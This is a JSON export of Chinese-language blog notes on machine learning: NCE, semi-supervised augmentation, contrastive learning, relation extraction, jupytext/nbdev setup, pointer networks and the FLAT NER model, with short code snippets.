啊，这不相当于构造这么多都白干了？ 所以NCE继续改进，将 \\(Z_\\theta(c)\\) 整体但做一个关于 c 的参数，参数化。然后一通操作，发现在神经网络模型这种参数巨多的情况下，将 \\(Z_\\theta(c)\\) 直接设为 1 ，反而是一种有效且高效的做法，文章里叫做 self-normalized。 所以，得到的关于 参数 \\(\\theta\\) 的分布表示为： \\[ \\begin{aligned} p(d=0 \\mid c, w) &amp;=\\frac{k \\times q(w)}{u_{\\theta}(w, c)+k \\times q(w)} \\\\ p(d=1 \\mid c, w) &amp;=\\frac{u_{\\theta}(w, c)}{u_{\\theta}(w, c)+k \\times q(w)} \\end{aligned} \\] 直接操作掉了求和配分项。目标也变成了一个二分类： \\[ \\mathcal{L}_{\\mathrm{NCE}_{k}}=\\sum_{(w, c) \\in \\mathcal{D}}\\left(\\log p(d=1 \\mid c, w)+k \\mathbb{E}_{\\bar{w} \\sim q} \\log p(d=0 \\mid c, \\bar{w})\\right) \\] 只是，其中求期望的部分需要所有单词在噪声分布下求值，得到期望，这显然是低效的。简单的办法，直接MC，期望转Sampling： \\[ \\begin{aligned} \\mathcal{L}_{\\mathrm{NCE}_{k}}^{\\mathrm{MC}} &amp;=\\sum_{(w, c) \\in \\mathcal{D}}\\left(\\log p(d=1 \\mid c, w)+k \\times \\sum_{i=1, \\bar{w} \\sim q}^{k} \\frac{1}{k} \\times \\log p(d=0 \\mid c, \\bar{w})\\right) \\\\ &amp;=\\sum_{(w, c) \\in \\mathcal{D}}\\left(\\log p(d=1 \\mid c, w)+\\sum_{i=1, \\bar{w} \\sim q}^{k} \\log p(d=0 \\mid c, \\bar{w})\\right) \\end{aligned} \\] 完 可以证明（求极值点嘛，再分析一波k趋于无穷的极限），这个目标函数的最优时，就是模型所表示的分布和经验分布匹配的时候。 NS(Negative Sampling) word2vec使用过的方法，直接可以写出目标条件分布： \\[ \\begin{array}{l} p(d=0 \\mid c, w)=\\frac{1}{u_{\\theta}(w, c)+1} \\\\ p(d=1 \\mid c, w)=\\frac{u_{\\theta}(w, c)}{u_{\\theta}(w, c)+1} \\end{array} \\] 可以看成 k = |V| 且 q 为均匀分布的NCE特殊情况。在分析一次像 \\(\\mathcal{L}_{\\mathrm{NCE}_{k}}\\) 的损失函数，或者是hinge loss形式的损失函数，求导分析极值，可以发现它最优时，模型所表示的分布和经验分布并不匹配，可以不一致。 也就是说，NS虽然在word2vec训练时，可以学习到word的representation，但是它并不适用于语言模型等更general的情景。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"ML","slug":"Notes/ML","permalink":"https://racleray.github.io/categories/Notes/ML/"}],"tags":[{"name":"NCE","slug":"NCE","permalink":"https://racleray.github.io/tags/NCE/"},{"name":"language model","slug":"language-model","permalink":"https://racleray.github.io/tags/language-model/"}]},{"title":"UDA & MixMatch","slug":"UDA-MixMatch","date":"2021-03-25T14:51:11.000Z","updated":"2023-08-07T11:54:31.035Z","comments":true,"path":"posts/d4b0eecc.html","link":"","permalink":"https://racleray.github.io/posts/d4b0eecc.html","excerpt":"简要记录两种比较新且有实际效果的数据增强方法思路。","text":"UDA 使用无监督方法，基本架构类似SimCLR等对比学习模型。 图中M为自定义的模型。 模型损失，UDA部分： 加上监督学习部分： 数据增广 图片数据：AutoAugment (RandAugment)、Cutout 文本数据：BackTranslation；基于TF-IDF的词替换，保留重要关键词，替换不重要词 训练方法 Training Signal Annealing (TSA)，在训练时逐步释放训练信号： 模型在有标注数据上，先拟合预测概率小于 \\(\\eta_t\\) 的数据，逐渐调整 \\(\\eta_t\\)，训练先难后易。 三种策略设置三种 \\(\\alpha_t\\)： log： linear: exp: 当模型容易过度拟合时，例如，当问题相对容易或标记数据非常有限时，exp-schedule是最合适的。相反，当模型不太可能过度拟合时(例如，当有丰富的标记数据或当模型使用有效的正则化时)，log-schedule更合适。 其他处理 在使用模型M预测 无标注数据时，使用Confidence-based masking，将概率小于 \\(\\beta\\) 的过滤掉。 使用sharpening prediction，大的更大，小的更小。 可以使用entropy minimization： ​ 上式中还可以使用MixMatch sharpenig： Domain-relevance Data Filtering：对于外部搜集的数据，对于每个类别，都基于对所有示例进行排序属于该类别的概率，并选择概率最高的示例，构成外部数据。 官方实现 MixMatch paper，tf2.0 方法 另一种混合有标签和无标签数据的方法。整体方法如下： 对于有标签数据，增广batch个，联合其标签 \\(p_b\\) 构成 \\(\\hat{X}\\) 对无标签数据，每个样本增广K个，通过Label Guessing，取模型对K个样本预测的均值，作为这K个样本的伪标签。构成样本集 \\(\\hat{U}\\). Shuffle样本集，将其进行MixUp，得到MixMatch样本集合 然后通过下式计算模型损失，模型为自定义模型： H就表示普通交叉熵损失，若是分类问题时。p、q就是MixMatch中得到的标签。q来自Label Guessing。 细节 使用的方法： 数据增广：crop, flip等常见方法 Label Guessing： sharpening： MixUp： 模型训练时可采用滑动平均、weight decay等方法 12345678910111213141516171819@tf.functiondef sharpen(p, T): return tf.pow(p, 1/T) / tf.reduce_sum(tf.pow(p, 1/T), axis=1, keepdims=True)@tf.functiondef mixup(x1, x2, y1, y2, beta): beta = tf.maximum(beta, 1-beta) x = beta * x1 + (1 - beta) * x2 y = beta * y1 + (1 - beta) * y2 return x, y...def ema(model, ema_model, ema_decay): for var, ema_var in zip(model.variables, ema_model.variables): if var.trainable: ema_var.assign((1 - ema_decay) * var + ema_decay * ema_var) else: ema_var.assign(tf.identity(var)) 消融实验结果： 使用论文中提到的所有方法，才能取得最好的结果。其中MixUp操作的影响最大。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Data Augmentation","slug":"Notes/Data-Augmentation","permalink":"https://racleray.github.io/categories/Notes/Data-Augmentation/"}],"tags":[{"name":"data augmentation","slug":"data-augmentation","permalink":"https://racleray.github.io/tags/data-augmentation/"}]},{"title":"Self-supervised methods note","slug":"self-supervised-methods-note","date":"2021-03-25T10:56:12.000Z","updated":"2023-08-07T11:54:31.037Z","comments":true,"path":"posts/aa316e6c.html","link":"","permalink":"https://racleray.github.io/posts/aa316e6c.html","excerpt":"简要记录从JEM、SupContrast、Momentum Contrast到Simple Siamese的一系列对比学习方法。","text":"JEM paper, link Google 建模联合概率，factorize为监督部分和非监督部分。同时论文指出从y开始factorize的话，效果会下降。 energy部分使用 Stochastic Gradient Langevin Dynamics （SGLD）对生成数据采样，最小化其energy framework： 达到效果：提高了 calibration（输出与真实分布具有一致性）, robustness, 和out-of-distribution detection方面的性能。 问题：训练自然会变慢（CIFAR10一个epoch为半个小时），另外就是不稳定，SGLD采样使用随机数据开始。 JEM采样方式来自 Implicit Generation and Modeling with EBM Buffer Sample igebm-pytorch， link，Google 先比于VAE和GAN，是一种根据energy采样的隐式采样，使用一个主网络，可以将生成的限制和目标构建成损失函数。但是生成样本分布需要更多的计算迭代次数。 energy based采样主要是高维数据采样困难。真实图片分布在high energy区域，噪声图片分布在low energy区域。 方法： 随机输入开始 使用模型输出 + SGLD迭代采样出sample i 将更新过的sample i重新写入buffer 2、3步迭代 K 次。K不能太小。论文中60，JEM 20 SGLD： SupContrast paper，git，Google contrastive learning一般的方式是，先数据增广，然后通过模型识别出来自同一张图的输入，将不是来自同一张图的输入的相似度变小。 Supervised Contrastive Learning将识别对象变为同一类图片，而不是同一张图片。 损失函数定义为： 论文中还有另一种形式的L，但是效果不好。 通过引入标签数据，计算同一类图片的相似度。在计算损失时，处理同一类图片方法如下 12345678910111213141516...# 将相同label的mask出来mask = torch.eq(labels, labels.T).float()# tile mask：增广数据shape匹配mask = mask.repeat(anchor_count, contrast_count)# mask-out 自己对自己位置进行masklogits_mask = torch.scatter( torch.ones_like(mask), 1, torch.arange(batch_size * anchor_count).view(-1, 1).to(device), 0)mask = mask * logits_mask... 模型训练分为两个阶段。如果只是训练一个encoder，只需要第一阶段。若是要进行分类任务，需要固定encoder训练第二阶段分类器。 实验结果：模型对超参数的敏感性降低，使用Supervised Contrastive Loss能够提升分类准确率（论文中在Imagenet等多个数据集上进行了实验）。 Hybrid Discriminative-Generative paper，git, UCB 通过对比学习contrastive learning，混合监督与非监督一起训练。和Supervised Contrastive Learning中的encoder框架不同，没有两个编码的 contrastive 计算。从 变为： 只有一个f(x)编码，和 label y。 这个和 cross entropy 有点像。但是数据来源不同，这里数据是来自K大小的 normalization samples，也是来自SGLD方法中设计的buffer。 这个方法也是针对loss进行变化： 计算两个部分的cross entropy loss。 论文结果，相比于JEM，在CIFAR10上的效果，有一定提升 提高了 calibration, robustness, 和out-of-distribution detection方面的性能。 同时K越大，效果越好。“有钱人的游戏”。 Momentum Contrast paper，git，FB PyContrast：pytorch implementation of a set of (improved) SoTA methods using the same training and evaluation pipeline. 首先contrastive loss 计算的一般框架： 就是 k+1个softmax分类器。 目前的训练方式： end to end：输入一个batch，进行数据增广，然后优化来自同一张图片的相似度。如果有多个类，那么一个batch的数据，覆盖的类是有限的。 memory bank: 使用一个encoder，构建memory bank（样本的vector表示集合），随机抽取batch size个数据，与query正例计算loss。然后再更新memory bank中的样本表达数据。如此循环。 MoCo：使用一个大小为k的queue，出队batch size个数据经过 momentum encoder，与query正例计算loss。然后使用 encoder的参数，以一定 momentum 更新 momentum encoder参数。重新入队batch size个样本。 momentum 更新，论文实验发现，m应该设置为一个很接近1的数，比如0.9999： MoCo伪代码： 经过MoCo得到一个预训练模型 encoder，使用就类似 BERT 之类的模型。 接一个简单 Linear classifier 就可以达到接近监督训练模型的效果。 SimCLR paper，git，Google 在MoCo之上的改进。两个点： 数据增广加一倍，一个图片会有两个 aug(x) 。 计算NCE时，使用Cosine Similarity，而不是MoCo中的 inner product。 增广方法使用了： framework： 模型结构： 使用encoder时，如果使用预训练的Resnet之类在ImageNet训练的模型，输出部分重新设计，不需要转到1000类，直接输出模型表征经过avgpool + fc 之后的结果，即 图中 h。 h 之后还增加 g(x) DNN层变换。 其他变化： 放弃 MoCo的 queue，也不用 memory bank，直接用很大的batch size.... 使用LARS优化器 32到128个GPU训练 论文给出的self-supervised模型+linear classifier在ImageNet上的Top-1 accuracy. Bootstrap your own latent paper, git， Google 结合SimCLR和MoCo： 结构还是SimCLR的结构，只是一个分支在这里称为online，一个称为target。 使用MoCo的 momentum 更新 momentum encoder参数的方法，更新target网路参数。 target部分不计算bp。 重新定义损失为mean squared error形式，不需要构造负样本对： 结构： 当然，又是一次提升: 同时，BYOL对batch的敏感性比SimCLR低一些。 Simple Siamese: simpler &amp; better paper，git， FB 结合了BOYL和SimCLR，将Siamese结构加入模型，得到一个更neat的设计。 删掉BOYL的 momentum encoder。 不用构造SimCLR中的negative pairs。 encoder对两个aug(x)计算hidden representation： 计算损失函数： 伪代码： stopgrad部分视为一个constant输入。 其他设计： 优化器SGD + 0.9 momentum动量 + 0.0001 的 weight decay 不再需要很大的batch size，batch size 512即可 消融实验结果： lr不要要decay，效果最好 batch size最大512即可 loss设计为 cosine 形式更好，在hidden层和predict层之前使用BN效果最好 Loss的对称计算形式提升了效果。 SimSiam不再需要negative sample pairs ，large batches ，和momentum encoders。终于找到一个简洁而有效的model。当然，后浪依然会有。 Why stop-gradient? 论文假设只是一个EM模型： 那么问题转化为： 假设从 \\(\\eta\\) 网络输出就假设为当前期望估计。更新\\(\\theta\\)就是在计算最优化损失。所以，计算期望时，自然是不更新\\(\\theta\\)的。 这里predictor的作用也是假设loss是在两侧 expectation 上进行计算的，这只是假设，严格证明没有。 这因为EM显示的合理性，所以在 stop-gradient 时，模型能够收敛到一个好的结果。而如果不进行 stop-gradient，训练反而会变得不稳定。 Contrastive Learning with Adversarial Examples 理论偏研究，没有开源实现。 基于SimCLR框架，选择能最大化差异的样本，然后再使之相似性损失最小化。 将SimCLR损失写成： 然后固定一个增广样本输入，然后找差异最大的另一个： 计算扰动： 得到对抗样本： 计算损失（16）： 算法设计： 计算 \\(W^*\\)（15）: More Adversarial Examples Improve Image Recognition paper，在EfficientNet中使用的效果评测 提升的基本思想，加入对抗样本，联合原数据进行训练 max部分为求得最大化差异的对抗样本损失。 但是，实际效果并不好，因为原数据与对抗样本的分布不匹配。所以提出，两个BN分布处理原数据和对抗样本。 然后，在预测时，只使用主BN层。 当模型越大，效果提升越明显。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Contrastive Learning","slug":"Notes/Contrastive-Learning","permalink":"https://racleray.github.io/categories/Notes/Contrastive-Learning/"}],"tags":[{"name":"contrastive learning","slug":"contrastive-learning","permalink":"https://racleray.github.io/tags/contrastive-learning/"},{"name":"self-supervise","slug":"self-supervise","permalink":"https://racleray.github.io/tags/self-supervise/"}]},{"title":"Joint Extraction of Entities and Relations 2020","slug":"Joint-Extraction-of-Entities-and-Relations-2020","date":"2021-03-24T15:37:55.000Z","updated":"2023-08-07T11:54:31.030Z","comments":true,"path":"posts/aa5b647c.html","link":"","permalink":"https://racleray.github.io/posts/aa5b647c.html","excerpt":"记录2020几篇关系抽取论文，包括CasRel、TPlinker和Two-are-better-than-one。其思路很机智。","text":"CasRel git 实体识别和关系分类一体化，使用一个model解决两个问题。优势在于，通过两个任务的相关性，设计model，减少两阶段预测中的级联误差。虽然，也有两阶段模型实际效果可以很好。 除了解决级联误差，还需要解决什么问题？ Overlapping relations：一个实体可以出现则同一文本中的多个关系中。 Nested relations：不同的三元组可能包含或共享嵌套实体。 Texts Triplets Normal [The United States] President [Trump] will meet [Xi Jinping], the president of [China]. (The United States, president, Trump) (China, president, Xi Jinping) Single Entity Overlapping Two of them, [Jeff Francoeur] and [Brian McCann], are from [Atlanta]. (Jeff Francoeur, live in, Atlanta) (Brian McCann, live in, Atlanta) Entity Pair Overlapping The new mayor of [New York City] [De Blasio] is native-born. (New York City, mayor, De Blasio) (De Blasio, born in, New York City) Nested The new mayor of [[New York] City] [De Blasio] is native-born. (De Blasio, live in, New York City) (De Blasio, live in, New York) (New York, contains, New York City) 同时，还存在的问题有：预测标签的不平衡，相同实体出现不同关系时model难以拟合。 framework CasRel是一种framework，将关系预测从标注分类转化为一个隐式变换，参与模型训练： \\[ f(s, o) \\rightarrow r \\] 本来是subject + object推断relation，变化为： \\[ f_r(s) \\rightarrow o \\] 将relation建模成一种function。 将likelihood变成以下形式： 模型整体架构 模型在多个关系抽取任务上，效果提升明显。 TPlinker git TPlinker是不同于现有模型的一种一体式关系抽取模型。解码方式独特。 通过实体边界词，区分嵌套实体：New York City -&gt; (New, City), New York -&gt; (New, York) 通过实体边界，分解三元组：(De Blasio, live in, New York City) -&gt; (De, live in, New) and (Blasio, live in, City) 两种常见的处理 relation overlapping 的模式： 都同时存在两个问题： 暴漏偏差（exposure bias） ：指在训练阶段是gold实体输入进行关系预测，而在推断阶段是上一步的预测实体输入进行关系判断；导致训练和推断存在不一致 嵌套实体（nested entities）：并没有有效处理嵌套实体关系。 TPlinker的标注方式 首先对不同的关系，分别进行标注。每种关系的标注方式相同。 三类标记： 紫色标记：单个实体的头尾对应关系。和关系类型无关。shape: len(text) * len(text) 红色标记：对应 subject和object 的 start对应标记。每种关系一个单独标记矩阵。shape: R * len(text) * len(text) 蓝色标记：对应 subject和object 的 end对应标记。每种关系一个单独标记矩阵。shape: R * len(text) * len(text) 同时，红色标记和蓝色标记，在len(text) * len(text)的矩阵中，存在两个对称的标记，比如（New, De）与 (De, New)。为了提高效率，将下三角部分映射到上三角部分，同时值变成2。 模型为： 图中 Handshaking Kernel，就是将 标记矩阵展开得到的一维编码。token pair 遍历了所有可能的 对应关系。图中S -- subject；O -- object; H -- head; T -- tail； E -- entity 通过这些标记，训练模型计算损失，token pair的encoder output拼接在一起，输入softmax，每个关系类型都有一个softmax。 解码过程 预测模型计算结果 结果EH-to-ET可以得到句子中所有的实体，EH的 token idx作为key，EH-to-ET的entity作为value，存入 D 中，得到可选实体； 开始遍历 不同关系； 结果SH-to-OH可以得到某种关系可选的 head 对应关系，取这些head index，从 D 中，取出对应实体对 token pair 存于 D2； 结果ST-to-OT可以得到某种关系可选的 tail 对应关系，将这个对应关系的 token pair 存入 E； 遍历D2，并检查 每一个 D2中的 token pair 的 tail 是否存在于 E 中，若存在，那么输出 该关系下的该三元组信息。 More 实体对输出的embedding表示是直接 concatenate，那么如果两个实体的context相似，那么理论上会影响预测效果。 由于要预测 N 个词中选 2 的排列个 pair，所以对于长文本，代价会很大。 Two-are-better-than-one git 统一NER和RE任务到一个表格标记预测任务。 标记形式很直观。只是这在14年就已经有这种方法的尝试了。这篇论文作者是对其进行了改进。 除了一些关系抽取任务常见的问题，这种标记方式还有一个问题： 现有的基于Table-Filling方法，会将表结构转化成一个序列结构，表结构的标记方式直接退化。 结构设计 首先是 Text Embedding：Glove词向量、LSTM字符向量和BERT词向量的共同构成。 Table Encoder：学习表格中每个位置的向量表达，shape: len(text) * len(text)。表格第 i 行第 j 列的向量表示，与句子中的第 i 个和第 j 个词相对应。 使用 MD-RNN 融合表格中上下左右的信息。接收 Sequence Encoder 编码的 当前 第 i 、第 j 个词的向量表示。 但是，论文实验发现，不必计算四组，只需要两组，就能达到几乎无损的效果。只计算 a 和 c。 Sequence Encoder：Sequence Encoder的结构与Transformer类似，不同之处在于将Transformer中的scaled dot-product attention 替换为 table-guided attention。 原 transformer 的 attention ： 变为： 直接使用 \\(T_{l,i,j}\\)节省了计算量，同时交互两个部分信息。 Pre-trained Attention Weights：利用预训练的 BERT 中每一层的 attention 信息，得到 \\(T^l\\) ，联合 S 构成MD-RNN的初始输入 。 预测结果表示为： 表格中对称位置，在预测时直接求和，得到一个关系的得分。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"relation extraction","slug":"relation-extraction","permalink":"https://racleray.github.io/tags/relation-extraction/"}]},{"title":"jupytext and nbdev","slug":"jupytext-and-nbdev","date":"2021-03-24T13:54:30.000Z","updated":"2023-08-07T12:20:13.022Z","comments":true,"path":"posts/c1cb8a12.html","link":"","permalink":"https://racleray.github.io/posts/c1cb8a12.html","excerpt":"记录fast.AI团队开源的 jupytext 与 nbdev 工具的配置。","text":"Jupytext 界面点击操作 当你 Pair 一种文件，保存时，会自动生成你 pair 关联的格式的文件。在其中一个文件修改的任何文本都会同步到两个文件中。 首先你有文件 然后，在jupyter lab中 ctrl + shift + c，选择pair的文件类型（jupyter notebook在功能菜单中找到） 然后，保存 关联成功。py文件可以在自己喜欢IDE环境编辑，ipynb文件可以同步展示。删除任意一个，都可以再次恢复。 取消pair，则不会同步。（unpair 取消关联） py文件中包含的 metadata 如下格式 命令行操作 Notebook to text 12jupytext --to markdown notebook.ipynbjupytext --to script notebook.ipynb text to notebook 12jupytext --to notebook notebook.pyjupytext --to notebook notebook.md text to notebook and preserve outputs 12jupytext --to notebook --update notebook.pyjupytext --to notebook --update notebook.md 命令行pair操作 1jupytext --set-formats ipynb,py:percent notebook.ipynb 同步paired notebooks，当在其他文件中修改后，同步到ipynb 1jupytext --sync notebook.ipynb 应用code style(flake8, black, isort) 1jupytext --pipe flake8 notebook.ipynb 支持文件格式 NBDEV开发 step 1 新建git 使用 the template 创建一个github repo 1pip install nbdev 可选，使用git自带的服务器：在setting中 在edit中添加生成的网址 step 2 编辑settings.ini 编辑settings.ini （注意这里的lib_name就是生成的包名，所以有空格很不规范）。前面的个人相关信息基本都要取消注释，后面在git上创建网页展示环境要check。 1git clone https://github.com/RacleRay/Hello_nbdev.git step 3 安装git_hooks 1nbdev_install_git_hooks 出现conflict错误时 1nbdev_fix_merge filename.ipynb step 4 编辑代码 开始编辑ipynb文件 标记类别： #default_exp 对于新创建的 .ipynb，需要加入 #default_exp target_module_name 这会导出生成以下py文件 1lib_name/target_module_name.py lib_name与settings时，保持一致 #export：效果如下 导出后显示如下 如果是类里面的方法，显示doc需要使用函数 show_doc 1from nbdev,showdoc import show_doc 不加标记会显示代码和输出 测试代码也可以写在这里，不代标记 1assert say_hello(\"Jeremy\")==\"Hello Jeremy!\" step 5 nbdev_build_lib 1nbdev_build_lib 注意，发生keyError时，多半是settings.ini配置不完整 生成新的lib包文件夹及py文件 core.py step 6 编写index文件 编辑index.ipnb step 7 生成docs文档 1nbdev_build_docs 生成HTML文档 step 8 上传git 1234git add -Agit statusgit commit -m \"test\"git push step 9 bug 检查 commits中的问题 没有设置keywords，在settings.ini中进行设置。 optional step 10 发布pypi 上传到pypi 注册pypi 在用户家目录下新建~/.pypirc 123[pypi]username = your_pypi_usernamepassword = your_pypi_password pip install twine make release 附 其他事项 安装包，同时同步所有在源码上的编辑 1pip install -e . 可以将自己开发的包链接到python包路径下 1ln -s lib_path lib_name autoreload 12%load_ext autoreload%autoreload 2 在ipynb结尾添加以下代码，用以代替命令行nbdev_build_lib。 1from nbdev.export import notebook2script; notebook2script() 检查可读的notebook 1nbdev_read_nbs 检查可能造成merge conficts的文件， 1nbdev_clean_nbs 可能导致cleaned项不通过，此时用，然后再push 检查notebook和已经导出的lib files之间的是否有差异 1nbdev_diff_nbs 运行notebooks中的测试 1nbdev_test_nbs fastai文档 nbdev git nbdev_template","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"python","slug":"Tools/python","permalink":"https://racleray.github.io/categories/Tools/python/"}],"tags":[{"name":"tools","slug":"tools","permalink":"https://racleray.github.io/tags/tools/"},{"name":"jupyter","slug":"jupyter","permalink":"https://racleray.github.io/tags/jupyter/"}]},{"title":"Pointer review","slug":"Pointer-review","date":"2021-03-18T14:37:39.000Z","updated":"2023-08-07T11:54:31.032Z","comments":true,"path":"posts/6875388b.html","link":"","permalink":"https://racleray.github.io/posts/6875388b.html","excerpt":"回顾一下Pointer network。在学习 transformer + pointer 的摘要生成模型时，得空稍稍记录一下。","text":"回顾一下Pointer network Pointer ? What ? 从一堆点中，找出 凸包 边界点。 convex hull：一条圈住所有点的橡皮筋 Seq generation bad seq2seq，在处理生成任务时，无法处理 OOV 问题。可以理解为，在decode时映射的词表vocabulary是变化的。 How to solve？ 假如，将输入text中每个word当做一个点，seq2seq任务转换为在输入的文本中找到一个 “convex hull” 可以summarize整个输入的语义内容，是否可行？ 输出全都从 输入 中 copy。 根据输入的语义表示，用一个language model输出生成文本。 假如要保持 decoder 的language model的泛化生成能力，同时copy一些输入中的重要信息。模型被修改为下面这样 输出为：联合 source text 中的attention distribution 和 decoder在vocabulary上的预测分布，以 Pgen 加权的结果。 Final distribution的分布中是包含了 source text 和 vocabulary 中的所有词的。 同时，\\(P_{gen}\\)设计为可学习的参数。 Reduce repeats？ 将 attention distribution 进行历史累计，在下一步计算attention时输入。即，Coverage Mechanism。 同时，添加新的损失项。让模型不要过分关注某些词。： 最终损失为： More 注意事项: （1）在模型训练到一定程度后，再使用Coverage Mechanism。 （2）在模型的训练环节，刚开始的时候，大约有70%的输出序列是由Pointer Network产生的，随着模型逐渐收敛，这个概率下降到47%。然而，在测试环节中，有83%的输出序列是由Pointer Network产生的。作者猜测这个差异的原因在于：训练环节的decoder使用了真实的目标序列。 （3）作者曾尝试使用一个15万长度的大词表，但是并不能显著改善模型效果。 Code 其他同类模型： 将LM部分也变为 attention ，进行多个 source text 的输入的生成任务。Multi-Source Pointer Network 不计算 \\(P_{gen}\\) ，而直接分成多种 情况，进行不同的 生成过程。CopyNet","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"},{"name":"pointer net","slug":"pointer-net","permalink":"https://racleray.github.io/tags/pointer-net/"}]},{"title":"实体识别模型与策略2020","slug":"实体识别模型与策略2020","date":"2021-03-10T15:21:03.000Z","updated":"2023-08-07T11:54:31.041Z","comments":true,"path":"posts/548512d6.html","link":"","permalink":"https://racleray.github.io/posts/548512d6.html","excerpt":"记录NER比赛中用到的新东西。FLAT模型结构，MRC等方法的设计思路，FGM和SWA等训练技巧，伪标签设计思路等。","text":"模型 FLAT FLAT部分Blog原文：https://mp.weixin.qq.com/s/6aU6ZDYPWPHc3KssuzArKw 论文：FLAT: Chinese NER Using Flat-Lattice Transformer 将Lattice图结构无损转换为扁平的Flat结构的方法，并将LSTM替换为了更先进的Transformer Encoder，更好地建模了序列的长期依赖关系； 提出了一种针对Flat结构的相对位置编码机制，使得字符与词汇信息交互更直接，在基于词典的中文NER模型中取得了SOTA。 由于中文词汇的稀疏性和模糊性，基于字符的序列标注模型往往比基于词汇的序列标注模型表现更好，但在基于字符的模型中引入分词信息往往能够带来性能的提升，尤其是对于NER任务来说，词汇能够提供丰富的实体边界信息。 Lattice LSTM首次提出使用Lattice结构在NER任务中融入词汇信息，如图所示，一个句子的Lattice结构是一个有向无环图，每个节点是一个字或者一个词。 设计适应Lattice结构的模型 Lattice LSTM (ACL 2018): 将词汇信息引入中文NER的开篇之作，作者将词节点编码为向量，并在字节点以注意力的方式融合词向量。 Lexicon Rethink CNN(IJCAI 2019): 作者提出了含有rethink机制的CNN网络解决Lattice LSTM的词汇冲突问题。 RNN和CNN难以建模长距离的依赖关系，且在Lattice LSTM中的字符只能获取前向信息，没有和词汇进行足够充分的全局交互 FLAT Git Repo 从Transformer的position representation得到启发，作者给每一个token/span(字、词)增加了两个位置编码，分别表示该span在sentence中开始(head)和结束(tail)的位置 扁平的结构允许我们使用Transformer Encoder，其中的self-attention机制允许任何字符和词汇进行直接的交互 Relative Position Encoding of Spans span是字符和词汇的总称，span之间存在三种关系：交叉、包含、分离，然而作者没有直接编码这些位置关系，而是将其表示为一个稠密向量。作者用 和 表示span的头尾位置坐标，并从四个不同的角度来计算 和 的距离： 使用\\(A^{*}_{i,j}\\)代替 tranformer 的self attention 中的 \\(A_{i,j}\\): 通过FLAT模型后，取出token的编码表示，将其送入CRF层进行解码得到预测的标签序列。 论文中给出的结果显示，FLAT相较于一众NER模型，取得了SOTA的效果。同时，使用较大规模数据时，效果更好。在对比实验中发现，字符与包含它的词汇之间的充分交互是很重要的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091class MultiHeadAttention(nn.Module): def __init__(self, hidden_size, num_heads, scaled=True, attn_dropout=None): super(MultiHeadAttentionRel, self).__init__() self.hidden_size = hidden_size self.num_heads = num_heads self.per_head_size = self.hidden_size // self.num_heads self.scaled = scaled assert (self.per_head_size * self.num_heads == self.hidden_size) # 正常 attention 的 q,k,v 变换矩阵 self.w_k = nn.Linear(self.hidden_size, self.hidden_size) self.w_q = nn.Linear(self.hidden_size, self.hidden_size) self.w_v = nn.Linear(self.hidden_size, self.hidden_size) # 计算 Rij 的权重 self.w_r = nn.Linear(self.hidden_size, self.hidden_size) # 计算 A* 的权重 self.u = nn.Parameter(torch.randn(self.num_heads, self.per_head_size), requires_grad=True) self.v = nn.Parameter(torch.randn(self.num_heads, self.per_head_size), requires_grad=True) self.dropout = nn.Dropout(attn_dropout) def forward(self, key, query, value, pos, flat_mask): \"pos 为 自定义的 postion embedding，对应公式的 Rij\" batch = key.size(0) # 输入线性变换 key = self.w_k(key) query = self.w_q(query) value = self.w_v(value) rel_pos_embedding = self.w_r(pos) ####### 计算 A* 矩阵的方法 和 论文不是完全一致 # batch, seq_len, n_head, d_head key = torch.reshape(key, [batch, -1, self.num_heads, self.per_head_size]) query = torch.reshape(query, [batch, -1, self.num_heads, self.per_head_size]) value = torch.reshape(value, [batch, -1, self.num_heads, self.per_head_size]) # batch, seq_len, seq_len, n_head, d_head rel_pos_embedding = torch.reshape(rel_pos_embedding, list(rel_pos_embedding.size()[:3]) + [self.num_heads, self.per_head_size]) # batch, n_head, seq_len, d_head key = key.transpose(1, 2) query = query.transpose(1, 2) value = value.transpose(1, 2) # batch, n_head, d_head, seq_len key = key.transpose(-1, -2) # 1, num_heads, 1, d_head u_for_c = self.u.unsqueeze(0).unsqueeze(-2) # batch, n_head, seq_len, d_head query_and_u_for_c = query + u_for_c # batch, n_head, seq_len, seq_len A_C = torch.matmul(query_and_u_for_c, key) # batch, n_head, seq_len, d_head, seq_len rel_pos_embedding_for_b = rel_pos_embedding.permute(0, 3, 1, 4, 2) # batch, n_head, seq_len, seq_len, 1, d_head query_for_b = query.view([batch, self.num_heads, query.size(2), 1, self.per_head_size]) # batch, n_head, seq_len, seq_len, 1, d_head query_for_b_and_v_for_d = query_for_b + self.v.view(1, self.num_heads, 1, 1, self.per_head_size) # batch, n_head, seq_len, seq_len B_D = torch.matmul(query_for_b_and_v_for_d, rel_pos_embedding_for_b).squeeze(-2) # batch, n_head, seq_len, seq_len attn_score_raw = A_C + B_D # 计算 score if self.scaled: attn_score_raw = attn_score_raw / math.sqrt(self.per_head_size) mask = 1 - flat_mask.long().unsqueeze(1).unsqueeze(1) attn_score_raw_masked = attn_score_raw.masked_fill(mask.bool(), -1e15) # batch, n_head, seq_len, seq_len attn_score = F.softmax(attn_score_raw_masked, dim=-1) attn_score = self.dropout(attn_score) # batch, n_head, seq_len, d_head value_weighted_sum = torch.matmul(attn_score, value) # batch, seq_len, n_head, d_head -&gt; batch, seq_len, hidden_size result = value_weighted_sum.transpose(1, 2).contiguous().reshape(batch, -1, self.hidden_size) return result BERT 教程博客很多，比如 http://jalammar.github.io/illustrated-bert/ CRF 参考 note1 note2 MRC 论文：A Unified MRC Framework for Named Entity Recognition Git Repo 转换为阅读理解（MRC）任务，来解决NER问题。似乎有很多搞研究的，都在尝试将NLP问题转换到MRC框架下，解决问题。 目的，解决NER中的实体重叠、嵌套关系问题。这是序列建模方式，比较难处理的问题。 